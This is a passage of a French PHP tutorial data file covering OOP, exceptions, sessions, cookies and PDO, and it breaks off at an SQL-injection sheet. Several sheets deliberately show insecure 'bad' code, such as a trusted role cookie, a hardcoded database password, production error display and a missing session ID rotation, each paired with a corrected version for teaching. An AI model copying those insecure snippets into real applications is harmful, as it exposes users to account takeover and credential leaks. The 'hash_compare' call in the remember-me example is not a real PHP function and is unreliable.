'abstract class Export\n{\n    abstract public function generer(): string;  // OBLIGATOIRE chez les enfants\n\n    final public function telecharger(string $nom): void  // commun, verrouillé\n    {\n        header("Content-Disposition: attachment; filename=$nom");\n        echo $this->generer();\n    }\n}\n\nclass ExportCsv extends Export\n{\n    public function generer(): string { return "produit;prix\\ngari;500"; }\n}\n\n// new Export();    ✗ Error : une classe abstraite ne s\'instancie PAS\n(new ExportCsv())->telecharger("catalogue.csv");' },
            { t: 'callout', kind: 'info', h: '`abstract` = « modèle incomplet, à compléter » — les enfants héritent du code commun ET doivent fournir les méthodes marquées abstract. `final` sur une classe = « interdiction d\'hériter » ; sur une méthode = « interdiction de la redéfinir ».' },
            { t: 'h3', h: 'Polymorphisme en action' },
            { t: 'code', lang: 'php', code:
'$paiements = [\n    new PaiementMobile(500, "MTN"),\n    new PaiementMobile(300, "Moov"),\n    new Paiement(200),                 // espèces au comptoir\n];\n\nforeach ($paiements as $p) {           // même message, comportements propres\n    echo $p->libelle() . "\\n";         // chaque classe répond à sa façon\n}' },
            { t: 'h3', h: 'Règles de bonne famille' },
            { t: 'ul', items: [
              'Hérite pour une relation **est-un** réelle ; sinon → composition (un objet EN a un autre).',
              'Un ou deux niveaux, rarement plus : la profondeur tue la lisibilité.',
              '`parent::__construct()` si l\'enfant redéfinit le constructeur — sinon l\'état du parent reste à zéro.',
              'Override = **signature compatible** (contravariance/liskov) : ne resserre pas les types, ne supprime pas de paramètres.',
              'Déclare `final` ce qui n\'est pas conçu pour l\'héritage — tu pourras toujours rouvrir, jamais refermer proprement.'
            ] }
          ],
          errors: [
            { title: 'Constructeur parent oublié', lang: 'php', bad:
'class PaiementMobile extends Paiement {\n    public function __construct(float $m, public string $op) {\n        // parent::__construct($m);  ← oublié\n    }\n}\n// $montant et $devise jamais initialisés → Erreurs à la 1re utilisation', good:
'public function __construct(float $m, public string $op) {\n    parent::__construct($m);   // initialiser la partie héritée d\'abord\n}', why: 'L\'enfant qui redéfinit le constructeur REMPLACE celui du parent : PHP n\'appelle rien automatiquement. parent::__construct() est ta responsabilité, généralement en première ligne.' },
            { title: 'Hériter pour récupérer du code', lang: 'php', bad:
'class Utilisateur extends Export {}   // un utilisateur "est un" export ??\nclass Panier extends Produit {}        // "est un produit" ? non : contient', good:
'// Composition : la relation est un "A-un"\nclass Panier {\n    /** @var Produit[] */\n    public function __construct(private array $produits = []) {}\n}\n// Code horizontalement réutilisable → trait (fiche suivante)', why: 'Hériter d\'une classe pour en récupérer les méthodes crée des hiérarchies mensongères et rigides. L\'héritage exprime une TAXONOMIE (est-un) ; la réutilisation de code se paie en composition ou en traits.' }
          ],
          related: ['php-poo-interfaces-traits', 'php-poo-visibilite', 'php-poo-classes', 'php-exceptions-custom']
        },

        {
          id: 'php-poo-interfaces-traits',
          title: 'Interfaces & traits',
          icon: 'merge_type',
          level: 'Avancé',
          tagline: 'Contracts sans code vs code sans contrat : implements pour le « peut-faire », trait pour la réutilisation horizontale.',
          intro: 'PHP n\'autorise qu\'un **seul parent** par classe — mais deux mécanismes cassent cette limite complémentairement. L\'**interface** décrit QUOI faire sans rien imposer du comment (contrat) ; le **trait** fournit le COMMENT à plusieurs classes sans lien de parenté (réutilisation horizontale). Ensemble : polymorphisme sans ascendance obligée.',
          blocks: [
            { t: 'h3', h: 'Interface : un contrat signé' },
            { t: 'code', lang: 'php', code:
'interface Exportable\n{\n    public function exporter(): string;   // public implicitement, aucun corps\n}\n\nclass Catalogue implements Exportable\n{\n    public function exporter(): string { return "catalogue…"; }\n}\n\nclass Facture implements Exportable {\n    /* si tu oublies exporter() → Fatal error : contrat non honoré */\n    public function exporter(): string { return "facture…"; }\n}\n\n// TYPIQUE : dépendre du CONTRAT, pas de l\'implémentation\nfunction imprimer(Exportable $doc): void { echo $doc->exporter(); }\nimprimer(new Catalogue());   // OK — accepte TOUT ce qui signe le contrat' },
            { t: 'callout', kind: 'tip', h: 'Une classe peut **implémenter plusieurs interfaces** (`implements A, B`) — c\'est la réponse PHP à l\'héritage multiple, sans ses drames (pas d\'état ni de code hérité, seulement des engagements).' },
            { t: 'h3', h: 'Trait : de la mécanique partagée' },
            { t: 'code', lang: 'php', code:
'trait Horodatable\n{\n    private ?DateTimeImmutable $cree_le = null;\n\n    public function marquer_creation(): void\n    {\n        $this->cree_le = new DateTimeImmutable();\n    }\n\n    public function age(): string\n    {\n        return $this->cree_le?->diff(new DateTimeImmutable())->format("%i min")\n            ?? "non horodaté";\n    }\n}\n\nclass Commande  { use Horodatable; }\nclass Vendeur   { use Horodatable; }\n\n$cmd = new Commande();\n$cmd->marquer_creation();\necho $cmd->age();   // les méthodes DU trait, copiées dans CHAQUE classe' },
            { t: 'h3', h: 'Collisions entre traits : insteadof & as' },
            { t: 'code', lang: 'php', code:
'trait A { public function hello(): string { return "A"; } }\ntrait B { public function hello(): string { return "B"; } }\n\nclass Demo\n{\n    use A, B {\n        A::hello insteadof B;        // en cas de doublon : lequel GAGNE\n        B::hello as hello_b;         // l\'autre reste dispo sous ALIAS\n    }\n}\n\n$d = new Demo();\necho $d->hello();      // A\necho $d->hello_b();    // B' },
            { t: 'table', head: ['', 'Interface', 'Trait', 'Classe abstraite'], rows: [
              ['répond à', '« peut-faire » (contrat)', '« réutilise-ce-code »', '« est-un » + code commun'],
              ['contient du code', 'non (constantes ok)', 'oui (méthodes, propriétés)', 'oui'],
              ['quantité par classe', 'plusieurs', 'plusieurs', 'une seule (extends)'],
              ['instanciable', 'non', 'non', 'non']
            ] },
            { t: 'callout', kind: 'warn', h: 'Abus classique : le trait fourre-tout de 15 méthodes insérées dans 12 classes (« globales déguisées »). Un bon trait est **petit et cohérent** (Horodatable) ; une fonctionnalité métier riche mérite souvent un vrai objet (composition).' }
          ],
          errors: [
            { title: 'Signature d\'interface non respectée', lang: 'php', bad:
'interface Exportable { public function exporter(): string; }\nclass Facture implements Exportable {\n    public function exporter($format) { }   // ✗ paramètre imposé, pas de : string', good:
'class Facture implements Exportable {\n    public function exporter(): string { return "…"; }   // signature compatible', why: 'Implémenter une interface, c\'est signer un contrat : mêmes noms, paramètres compatibles (tu peux ajouter des paramètres OPTIONNELS ou élargir un type de retour avec covariance PHP 7.4+), sinon Fatal error immédiate.' },
            { title: 'Interface remplie « comme une classe » ', lang: 'php', bad:
'interface Exportable {\n    public function exporter(): string {\n        return "csv";               // ✗ PAS de corps dans une interface\n    }\n}', good:
'// Besoin de code commun ? → classe abstraite (héritage) OU trait.\n// L\'interface reste pure : signature + constantes, rien d\'autre.', why: 'L\'interface n\'a aucun état et aucune implémentation : c\'est précisément ce qui la rend combinable sans conflits. Dès qu\'un « comment » partagé est nécessaire, trait ou classe abstraite prennent le relais.' }
          ],
          related: ['php-poo-heritage', 'php-poo-visibilite', 'php-exceptions-custom', 'php-composer']
        }
      ]
    },

    /* 10. GESTION DES ERREURS */
    {
      id: 'erreurs',
      name: 'Gestion des erreurs',
      icon: 'error',
      fiches: [
        {
          id: 'php-erreurs',
          title: 'Erreurs PHP & try/catch/finally',
          icon: 'report',
          level: 'Intermédiaire',
          tagline: 'Niveaux d\'erreur, error_reporting, l\'arbre Error/Exception, et le trio try/catch/finally pour les dérapages prévus.',
          intro: 'Deux familles de « ça ne marche pas » cohabitent : les **erreurs PHP** (warning, notice, fatal — le moteur te parle de ton code) et les **exceptions** (ton code signale une situation anormale que tu peux rattraper). Bien développer, c\'est **voir toutes les erreurs en local**, **les logger — pas les afficher — en prod**, et utiliser try/catch pour les cas que tu anticipes.',
          blocks: [
            { t: 'h3', h: 'Les niveaux d\'erreur PHP' },
            { t: 'table', head: ['Niveau', 'Exemple', 'Conséquence'], rows: [
              ['`E_DEPRECATED`', 'fonction vieillissante', 'continue — prépare ta migration'],
              ['`E_NOTICE` / `E_WARNING`', 'clé absente, division par array…', 'continue — mais BUG probable'],
              ['`E_RECOVERABLE_ERROR`', 'mauvais type catchable', 'si non catchée → fatal'],
              ['`E_ERROR` (fatal)', 'classe inconnue, function sur null', '**arrêt immédiat**']
            ] },
            { t: 'code', lang: 'php', label: 'dev vs prod — réglages à connaître', code:
'// Développement (php.ini local ou en tête de bootstrap) :\nerror_reporting(E_ALL);\nini_set("display_errors", "1");      // les erreurs SOUS les yeux\n\n// Production :\nerror_reporting(E_ALL);\nini_set("display_errors", "0");      // JAMAIS à l\'écran\nini_set("log_errors", "1");          // → error_log (fichier/syslog)\nini_set("error_log", "/var/log/php/app.log");' },
            { t: 'callout', kind: 'warn', h: '`display_errors=1` en production affiche chemins serveur, requêtes SQL, clés — de l\'or pour un attaquant et du bruit pour tes visiteurs. **En prod : logguer, afficher une page d\'erreur neutre.**' },
            { t: 'h3', h: 'try / catch / finally : le vol plané maîtrisé' },
            { t: 'code', lang: 'php', code:
'function commander(int $qte): void\n{\n    if ($qte <= 0) {\n        throw new InvalidArgumentException("Quantité positive exigée.");\n    }\n    // …\n}\n\ntry {\n    commander(-3);\n    echo "Cette ligne n\'est jamais atteinte";\n} catch (InvalidArgumentException $e) {          // du PLUS PRÉCIS…\n    echo "Saisie invalide : " . $e->getMessage();\n} catch (Throwable $e) {                          // …au filet de sécurité\n    error_log($e);                                // LOGGUER, au minimum !\n    http_response_code(500);\n} finally {\n    // TOUJOURS exécuté (exception ou non) : fermer, libérer, nettoyer\n}' },
            { t: 'h3', h: 'L\'arbre : Error ≠ Exception' },
            { t: 'ul', items: [
              '`Throwable` : l\'ancêtre de tout ce qui se « throw »',
              '`Error` : fautes de PROGRAMMATION (TypeError, DivisionByZeroError, Appel sur null…) — ne se catche qu\'en dernier recours pour logger',
              '`Exception` : situations anormales ATTENDUES (BDD coupée, fichier absent, saisie invalide) — à intercepter là où tu peux réagir'
            ] },
            { t: 'code', lang: 'php', code:
'// Attraper large pour LOGGER, ciblé pour AGIR :\ntry {\n    $pdo = new PDO($dsn, $user, $pass);\n} catch (PDOException $e) {\n    error_log("BDD injoignable : " . $e->getMessage());\n    exit("Service temporairement indisponible.");\n}' }
          ],
          errors: [
            { title: 'Le catch silencieux', lang: 'php', bad:
'try {\n    sauvegarder_commande($cmd);\n} catch (Throwable $e) {\n    // « on verra plus tard »\n}', good:
'} catch (PDOException $e) {\n    error_log($e->getTraceAsString());\n    throw new RuntimeException("Commande non enregistrée", 0, $e);\n}', why: 'Un catch vide transforme chaque plantage en mystère : la boutique « marche » mais aucune commande n\'arrive. Règle minimale absolue : une exception catchée est logguée, convertie, ou remontée — jamais avalée.' },
            { title: 'Afficher les erreurs en production', lang: 'php', bad:
'// php.ini prod :\ndisplay_errors = On\n// → tableau d\'erreur SQL complet offert à chaque visiteur (et bot)', good:
'display_errors = Off\nlog_errors = On\n// + page 500 neutre, + monitoring (Sentry, logs centralisés)', why: 'Une stack trace révèle la structure du code, les chemins, parfois des fragments de requêtes et d\'identifiants : c\'est une reconnaissance gratuite pour un attaquant. L\'utilisateur, lui, veut une page propre ; toi, tu veux le log.' }
          ],
          related: ['php-exceptions-custom', 'php-pdo', 'js-erreurs', 'php-serveur-local']
        },

        {
          id: 'php-exceptions-custom',
          title: 'Exceptions personnalisées & chaînage',
          icon: 'priority_high',
          level: 'Avancé',
          tagline: 'Des erreurs-métiers nommées (StockInsuffisantException), le chaînage via previous, et quand créer sa propre classe.',
          intro: '`throw new Exception("stock")` fonctionne… mais à l\'usage, tout le monde catche « Exception » et personne ne distingue une rupture de stock d\'une panne BDD. Créer ses **exceptions métiers** — une classe par situation, héritant d\'`Exception` ou d\'un marqueur commun — permet des `catch` chirurgicaux et un code qui raconte son domaine.',
          blocks: [
            { t: 'h3', h: 'Une classe par situation' },
            { t: 'code', lang: 'php', code:
'// Hérite d\'Exception (ou d\'une SPL proche : DomainException, RuntimeException)\nclass StockInsuffisantException extends RuntimeException\n{\n    public function __construct(\n        public readonly string $produit,\n        public readonly int    $demande,\n        public readonly int    $disponible,\n        ?Throwable $previous = null,\n    ) {\n        parent::__construct(\n            "Stock insuffisant pour $produit : $demande demandés, $disponible dispo.",\n            0, $previous,\n        );\n    }\n}\n\nthrow new StockInsuffisantException("gari", 10, 3);' },
            { t: 'h3', h: 'Le catch chirurgical' },
            { t: 'code', lang: 'php', code:
'try {\n    $panier->commander("gari", 10);\n} catch (StockInsuffisantException $e) {\n    // Cas MÉTIER prévu : réponse douce et précise\n    echo "Il ne reste que {$e->disponible} sacs de {$e->produit}.";\n} catch (PDOException $e) {\n    // Panne technique : log + page sobre\n    error_log($e);\n    http_response_code(503);\n} catch (Throwable $e) {\n    error_log($e);\n    http_response_code(500);\n}' },
            { t: 'h3', h: 'Chaîner : previous, la mémoire du bug' },
            { t: 'code', lang: 'php', code:
'try {\n    $pdo->query("SELECT * FROM commandes");\n} catch (PDOException $e) {\n    // Emballer SANS perdre l\'original : 3e argument = previous\n    throw new RuntimeException("Lecture des commandes impossible", 0, $e);\n}\n\n// Au diagnostic :\n$e->getMessage();     // "Lecture des commandes impossible"\n$e->getPrevious();    // le PDOException d\'ORIGINE, avec SA trace\n// → la chaîne raconte l\'histoire entière : quoi, où, pourquoi' },
            { t: 'h3', h: 'Marqueurs & sous-arbres métiers' },
            { t: 'code', lang: 'php', code:
'interface BoutiqueException extends Throwable {}     // marqueur\n\nclass PaiementRefuseException extends RuntimeException implements BoutiqueException {}\nclass LivraisonImpossibleException extends LogicException implements BoutiqueException {}\n\ntry {\n    // …\n} catch (BoutiqueException $e) {   // attrape TOUTE la famille métier\n    // réponse 4xx ciblée\n}' },
            { t: 'callout', kind: 'tip', h: 'Quand créer la classe ? Dès que deux endroits doivent **réagir différemment** au même message d\'erreur, ou qu\'un `catch` te force à lire `getMessage()` pour savoir de quoi il retourne (un code d\'erreur déguisé en texte — pire pratique).' },
            { t: 'p', h: 'Et les **SPL exceptions** ? PHP livre `InvalidArgumentException`, `DomainException`, `RuntimeException`, `LogicException`… pré-nommées. Réflexe : une SPL correspond-elle ? Hérite d\'elle. Sinon hérite d\'`Exception` — et n\'oublie jamais `parent::__construct($message, $code, $previous)`.' }
          ],
          errors: [
            { title: 'Une Exception générique pour tout', lang: 'php', bad:
'if ($stock < $qte) { throw new Exception("stock"); }\nif (!$this->pdo)   { throw new Exception("bdd"); }\n// à l\'usage : impossible de distinguer sans lire le message', good:
'throw new StockInsuffisantException($produit, $qte, $stock);\nthrow new RuntimeException("BDD non initialisée");\n// catch (StockInsuffisantException …) → réponse ciblée', why: 'Le TYPE de l\'exception est son canal de tri : c\'est lui que les catch filtrent. Un type unique oblige à analyser des chaînes de caractères — fragile dès qu\'on change la ponctuation du message.' },
            { title: 'Jeter l\'originale sans la conserver', lang: 'php', bad:
'} catch (PDOException $e) {\n    throw new Exception("Erreur commande");   // la cause a disparu !\n}', good:
'} catch (PDOException $e) {\n    throw new RuntimeException("Erreur commande", 0, $e);\n} // getPrevious() garde la trace SQL complète pour les logs', why: 'Remonter une nouvelle exception en perdant l\'originale coupe l\'histoire au moment crucial : en production, le log ne montre plus la CAUSE racine. Le 3e paramètre previous existe exactement pour le chaînage.' }
          ],
          related: ['php-erreurs', 'php-poo-heritage', 'php-poo-interfaces-traits', 'lv-erreurs']
        }
      ]
    },

    /* 11. SESSIONS & COOKIES */
    {
      id: 'sessions',
      name: 'Sessions & cookies',
      icon: 'how_to_reg',
      fiches: [
        {
          id: 'php-sessions',
          title: 'Sessions : un état qui survit aux pages',
          icon: 'how_to_reg',
          level: 'Intermédiaire',
          tagline: 'PHPSESSID, $_SESSION, session_start avant toute sortie — et la régénération d\'ID qui stoppe la fixation.',
          intro: 'HTTP est **sans état** : chaque requête repart de zéro. La session résout ça élégamment : PHP crée un **dossier côté serveur** (un identifiant + des données), n\'envoie au navigateur qu\'un **cookie d\'ID** (`PHPSESSID`), et à chaque requête, il retrouve le dossier. Les données, elles, ne quittent jamais le serveur.',
          blocks: [
            { t: 'h3', h: 'Le mécanisme en trois coups' },
            { t: 'ol', items: [
              '1re visite : `session_start()` crée un ID aléatoire et le met en cookie (`Set-Cookie: PHPSESSID=…`)',
              'le navigateur renvoie ce cookie à CHAQUE requête suivante',
              '`session_start()` retrouve le dossier et remplit `$_SESSION` — ton état revit'
            ] },
            { t: 'code', lang: 'php', code:
'<?php\nsession_start();                    // EN PREMIER, avant TOUT output (echo, HTML,\n                                    // espace avant <?php, BOM UTF-8 → headers !)\n\n$_SESSION["pseudo"]  = "awa";\n$_SESSION["panier"]  = ["gari" => 2, "piment" => 1];\n$_SESSION["derniere_activite"] = time();\n\n// Navigation : achats.php, compte.php… $_SESSION retrouvée à chaque page\n$pseudo = $_SESSION["pseudo"] ?? "invité";\n$nb_sacs = $_SESSION["panier"]["gari"] ?? 0;' },
            { t: 'callout', kind: 'warn', h: '`session_start()` **avant la moindre sortie** : il doit poser son cookie via un en-tête HTTP, or les en-têtes ferment dès le premier octet de corps. « headers already sent » = un espace/echo/BOM avant. (Astuce de survie temporaire : ob_start() — pas un mode de vie.)' },
            { t: 'h3', h: 'Sécuriser : régénérer l\'ID au login' },
            { t: 'code', lang: 'php', code:
'// Au moment où l\'identité CHANGE (connexion réussie) :\nif (password_verify($mdp_saisi, $user["hash"])) {\n    session_regenerate_id(true);    // NOUVEL ID (l\'ancien est détruit)\n    $_SESSION["user_id"] = $user["id"];\n    $_SESSION["role"]    = $user["role"];\n    header("Location: /compte.php");\n    exit;\n}\n\n// Cookie de session durci (dans php.ini ou avant session_start) :\nini_set("session.cookie_httponly",  "1");   // inaccessible au JS (anti-XSS vol d\'ID)\nini_set("session.cookie_samesite",  "Lax"); // limite les envois cross-site (anti-CSRF)\nini_set("session.cookie_secure",    "1");   // HTTPS uniquement\nini_set("session.use_strict_mode",  "1");   // refuse les IDs non créés par PHP' },
            { t: 'h3', h: 'Déconnexion complète (les 3 étages)' },
            { t: 'code', lang: 'php', code:
'session_start();\n$_SESSION = [];                                  // 1. vider les données\n\nif (ini_get("session.use_cookies")) {            // 2. expirer le cookie\n    $p = session_get_cookie_params();\n    setcookie(session_name(), "", time() - 42000,\n        $p["path"], $p["domain"], $p["secure"], $p["httponly"]);\n}\n\nsession_destroy();                               // 3. détruire côté serveur' },
            { t: 'h3', h: 'Durées de vie' },
            { t: 'table', head: ['Réglage', 'Rôle'], rows: [
              ['`session.gc_maxlifetime`', 'durée avant ramasse-miettes serveur (défaut 1440 s)'],
              ['`session.cookie_lifetime`', 'durée du cookie navigateur (0 = jusqu\'à fermeture)'],
              ['ton propre horodatage', '`$_SESSION["derniere_activite"]` + test d\'inactivité (le plus fiable)']
            ] },
            { t: 'callout', kind: 'tip', h: 'Le garbage collector PHP est probabiliste : pour une vraie règle d\'expiration (30 min d\'inactivité), stocke l\'horodatage d\'activité en session et vérifie-le toi-même à chaque requête sensible.' }
          ],
          errors: [
            { title: 'Session non régénérée après connexion', lang: 'php', bad:
'if ($login_ok) {\n    $_SESSION["user_id"] = $id;     // même ID qu\'avant le login\n}', good:
'if ($login_ok) {\n    session_regenerate_id(true);    // rotation d\'ID = fixation neutralisée\n    $_SESSION["user_id"] = $id;\n}', why: 'Attaque par FIXATION : l\'attaquant plante un ID de session connu (lien piégé) puis attend que la victime s\'y connecte — l\'ID devient un sésame. Régénérer l\'ID au changement de privilèges rend l\'ID piégé inutile.' },
            { title: 'session_start() après une sortie', lang: 'php', bad:
'<?php echo " "; ?>\n<?php session_start();   // headers already sent : session ratée', good:
'<?php\nsession_start();          // RIEN avant : ni espace, ni BOM, ni HTML\n// (config.php inclus ? == ses fichiers n\'ont PAS de ?> final…)', why: 'Le cookie se pose via un en-tête HTTP ; le moindre octet de corps envoyé clôt la phase d\'en-têtes. Le coupable classique : un fichier inclus qui traîne un espace après son ?> final — d\'où la convention de l\'omettre.' }
          ],
          related: ['php-cookies', 'php-superglobales', 'php-mots-de-passe', 'lv-authentification']
        },

        {
          id: 'php-cookies',
          title: 'Cookies : durée & flags de sécurité',
          icon: 'cookie',
          level: 'Intermédiaire',
          tagline: 'setcookie, $_COOKIE à la requête suivante, expiration, et le triptyque HttpOnly / Secure / SameSite.',
          intro: 'Un cookie est une petite étiquette que le serveur colle au navigateur, et que celui-ci **renvoie à chaque requête** vers le domaine. Parfait pour préférences et souvenirs (thème sombre, panier invité) — mais lisible et modifiable côté client : **jamais de données de confiance dedans**, et toujours les flags de sécurité modernes.',
          blocks: [
            { t: 'h3', h: 'Poser, lire, supprimer' },
            { t: 'code', lang: 'php', code:
'// POSER (avant tout output — c\'est un en-tête !)\nsetcookie(\n    "theme",                        // nom\n    "sombre",                       // valeur (string, sérialise le reste toi-même)\n    time() + 60 * 60 * 24 * 30,     // expiration UNIX : +30 jours\n    "/",                            // path : visible sur tout le site\n);\n\n// LIRE : à la requête SUIVANTE (le cookie doit faire le voyage aller-retour)\n$theme = $_COOKIE["theme"] ?? "clair";\n\n// SUPPRIMER : même nom + expiration dans le passé\nsetcookie("theme", "", time() - 3600, "/");' },
            { t: 'h3', h: 'Les trois flags qui changent tout' },
            { t: 'code', lang: 'php', code:
'// Forme tableau (PHP 7.3+) — la plus lisible :\nsetcookie("panier", $token, [\n    "expires"  => time() + 60 * 60 * 24 * 7,\n    "path"     => "/",\n    "secure"   => true,     // HTTPS uniquement (pas d\'écoute en clair)\n    "httponly" => true,     // invisible pour document.cookie (anti-vol XSS)\n    "samesite" => "Lax",    // pas envoyé sur POST/iframe cross-site (anti-CSRF)\n]);' },
            { t: 'table', head: ['Flag', 'Protège contre', 'Sans lui'], rows: [
              ['`HttpOnly`', 'vol du cookie par JS (XSS)', 'document.cookie lit tout'],
              ['`Secure`', 'interception réseau (HTTP clair)', 'le cookie part en clair'],
              ['`SameSite=Lax/Strict`', 'envoi cross-site (CSRF)', 'lié à tout site appelant']
            ] },
            { t: 'h3', h: 'Ce qu\'on y met — et ce qu\'on n\'y met JAMAIS' },
            { t: 'ul', items: [
              'OUI : préférences (langue, thème), ID de session anonymisé, jeton « se souvenir de moi » **hashé** en BDD.',
              'NON : rôles (`admin=1` — modifiable !), identifiants, panier chiffré maison, quoi que ce soit qui « prouve » quelque chose.',
              'Limite : ~4 Ko par cookie, ~20-50 par domaine, et le navigateur les envoyé à CHAQUE requête (les images incluses) — pense bande passante.',
              'Un cookie n\'est pas une session : les données vivent chez le client. La session, c\'est un cookie d\'ID + des données au chaud côté serveur (fiche Sessions).'
            ] },
            { t: 'h3', h: 'Pattern « remember me » digne de ce nom' },
            { t: 'code', lang: 'php', code:
'// Jeton aléatoire, HASH STOCKÉ en BDD, jamais le mot de passe :\n$jeton = bin2hex(random_bytes(32));\n// INSERT INTO remember_tokens (user_id, hash, expires) VALUES (?, SHA2(?), …)\nsetcookie("remember", $jeton, time() + 60 * 60 * 24 * 30, "/", "", true, true);\n\n// Au retour : hash_compare du cookie vs la table → nouvelle session, rotation du jeton' }
          ],
          errors: [
            { title: 'Faire dormir la confiance dans un cookie', lang: 'php', bad:
'setcookie("role", "vendeur", time() + 86400);\n// l\'utilisateur édite : role = "admin" ✓ accès total', good:
'// Rôle en $_SESSION (donnée SERVEUR) ; le cookie ne transporte\n// qu\'un identifiant de session ou un jeton opaque, vérifié côté serveur.', why: 'Le navigateur est le territoire de l\'utilisateur : chaque cookie est lisible ET modifiable (DevTools, extensions). Toute donnée qui accorde un droit doit vivre côté serveur ; le cookie n\'est qu\'une clé de correspondance.' },
            { title: 'Lire le cookie juste après setcookie', lang: 'php', bad:
'setcookie("theme", "sombre", time() + 86400);\necho $_COOKIE["theme"] ?? "clair";   // "clair" : trop tôt !', good:
'$theme = $_POST["theme"] ?? ($_COOKIE["theme"] ?? "clair");\n// à partir de la prochaine requête, $_COOKIE["theme"] existera', why: 'setcookie émet un EN-TÊTE de réponse ; $_COOKIE reflète la requête REÇUE. Le cookie ne réapparaît qu\'au prochain aller-retour client→serveur — pas dans la même exécution.' }
          ],
          related: ['php-sessions', 'php-superglobales', 'php-csrf', 'php-mots-de-passe']
        }
      ]
    }
);

/* ============================================================
   data-php.js — partie 4 : bases de données (PDO), sécurité,
   Composer/PSR-4, API REST, namespaces.
   ============================================================ */

DEVDOCS.php.categories.push(
    /* 12. BASES DE DONNÉES (PDO) */
    {
      id: 'bdd',
      name: 'Bases de données',
      icon: 'storage',
      fiches: [
        {
          id: 'php-pdo',
          title: 'PDO : la connexion universelle',
          icon: 'storage',
          level: 'Intermédiaire',
          tagline: 'Un seul objet pour MySQL, PostgreSQL, SQLite… plus deux options vitales : exceptions et fetch associatif.',
          intro: 'Au fil des ans, PHP a connu mysql_* (mort), mysqli_* (vivant mais verbeux), et **PDO** (PHP Data Objects) : une interface unique qui dialogue avec la plupart des bases via des pilotes. Apprendre PDO une fois = savoir parler à MySQL, PostgreSQL ou SQLite avec le même code. Mais une PDO mal configurée **avale les erreurs en silence** — d\'où la liste d\'options non négociable.',
          blocks: [
            { t: 'h3', h: 'Se connecter : le DSN' },
            { t: 'code', lang: 'php', code:
'// DSN = Data Source Name : pilote:hôte;base;jeu de caractères\n$dsn = "mysql:host=localhost;dbname=boutique_dantokpa;charset=utf8mb4";\n\ntry {\n    $pdo = new PDO($dsn, $user, $pass, [\n        // 1. LES ERREURS LÈVENT DES EXCEPTIONS (défaut historique : silence !)\n        PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,\n        // 2. fetch() rend des tableaux ASSOCIATIFS par défaut\n        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,\n        // 3. Vraies requêtes préparées côté serveur (pas émulées)\n        PDO::ATTR_EMULATE_PREPARES   => false,\n    ]);\n    echo "Connecté à MySQL " . $pdo->getAttribute(PDO::ATTR_SERVER_VERSION);\n} catch (PDOException $e) {\n    error_log($e->getMessage());       // les détails : pour les logs\n    exit("Boutique momentanément fermée.");  // pour les visiteurs\n}' },
            { t: 'callout', kind: 'warn', h: 'Sans `ERRMODE_EXCEPTION`, chaque appel retourne `false` en cas d\'échec **sans rien dire** : les bugs se découvrent dix lignes plus loin, quand `fetch()` explose sur un booléen. C\'est L\'option à écrire les yeux fermés.' },
            { t: 'h3', h: 'Lire et écrire : le premier aller-retour' },
            { t: 'code', lang: 'php', code:
'// Lecture directe (POUR LES REQUÊTES SANS DONNÉES UTILISATEUR !)\n$produits = $pdo->query("SELECT id, nom, prix FROM produits")\n                ->fetchAll();                      // tableau de lignes\n\nforeach ($produits as $p) {\n    echo $p["nom"] . " : " . $p["prix"] . " FCFA\\n";\n}\n\n// fetch() = UNE ligne (ou false si plus rien) ; fetchAll() = tout\n$une = $pdo->query("SELECT COUNT(*) AS total FROM produits")->fetch();\necho $une["total"];\n\n// Écriture hors SELECT → exec() rend le nombre de lignes affectées\n$n = $pdo->exec("DELETE FROM produits WHERE stock = 0");' },
            { t: 'h3', h: 'PDO vs MySQLi : que choisir ?' },
            { t: 'table', head: ['', 'PDO', 'MySQLi'], rows: [
              ['bases supportées', '12+ (MySQL, PgSQL, SQLite…)', 'MySQL/MariaDB seulement'],
              ['API', '100 % orientée objet', 'objet ET procédurale'],
              ['paramètres nommés `:nom`', '✓', '✗ (? seulement)'],
              ['recommandation', '**oui** — le standard d\'apprentissage', 'si spécificités MySQL vitales']
            ] },
            { t: 'h3', h: 'Les identifiants : hors du code versionné' },
            { t: 'code', lang: 'php', code:
'// config.php — DANS .gitignore, jamais sur GitHub :\nreturn [\n    "dsn"  => getenv("DB_DSN")  ?: "mysql:host=localhost;dbname=boutique;charset=utf8mb4",\n    "user" => getenv("DB_USER") ?: "root",\n    "pass" => getenv("DB_PASS") ?: "",\n];\n\n// bootstrap :\n$config = require __DIR__ . "/config.php";\n$pdo = new PDO($config["dsn"], $config["user"], $config["pass"], [/* options */]);' },
            { t: 'p', h: 'Laravel abstrait tout ça (fiche Eloquent du module Laravel) : chaque modèle PHP = une table. Concepts identiques — une connexion, des requêtes préparées, des exceptions — habillés d\'un ORM.' }
          ],
          errors: [
            { title: 'L\'attrape-erreurs laissé en mode silencieux', lang: 'php', bad:
'$pdo = new PDO($dsn, $user, $pass);          // options oubliées\n$stmt = $pdo->query("SELEC nom FROM produits"); // faute de frappe SQL\n$rows = $stmt->fetchAll();   // Fatal error : fetchAll sur false', good:
'$pdo = new PDO($dsn, $user, $pass, [\n    PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,\n]);\n// la même faute → PDOException immédiate, message SQL précis', why: 'Par défaut (héritage de PHP 5), PDO retourne false et pose un code d\'erreur à consulter soi-même… que personne ne consulte. ERRMODE_EXCEPTION transforme chaque faute en exception rattrapable, loggable, visible.' },
            { title: 'Identifiants en dur dans un fichier versionné', lang: 'php', bad:
'$pdo = new PDO($dsn, "root", "MotDePasse123");  // commit → GitHub → bots', good:
'$pdo = new PDO($config["dsn"], $config["user"], $config["pass"], $opt);\n// config.php (ou .env) listé dans .gitignore, jamais commité', why: 'Les dépôts publics sont scannés en continu : un mot de passe commité est compromis en minutes — et l\'historique Git le garde même si tu le retires. Secret = variable d\'environnement + fichier ignoré.' }
          ],
          related: ['php-requetes-preparees', 'php-crud', 'php-erreurs', 'lv-eloquent']
        },

        {
          id: 'php-requetes-preparees',
          title: 'Requêtes préparées & injection SQL',
          icon: 'key',
          level: 'Intermédiaire',
          tagline: 'La requête et les données voyagent SÉPARÉMENT : prepare/execute, et l\'injection SQL qui disparaît par construction.',
          intro: 'L\'**injection SQL** reste l\'attaque n°1 des applications PHP : concaténer une saisie dans une requête, c\'est laisser l\'utilisateur écrire du SQL. La réponse n\'est pas un échappement plus ou moins soigneux, mais la **requête préparée** : le serveur SQL reçoit d\'abord le plan de la requête (avec des trous `?` ou `:nom`), PUIS les données — qui ne sont jamais interprétées comme du code. Par construction, l\'injection devient impossible.',
          blocks: [
            { t: 'h3', h: 'Le théâtre du crime (en milieu contrôlé)' },
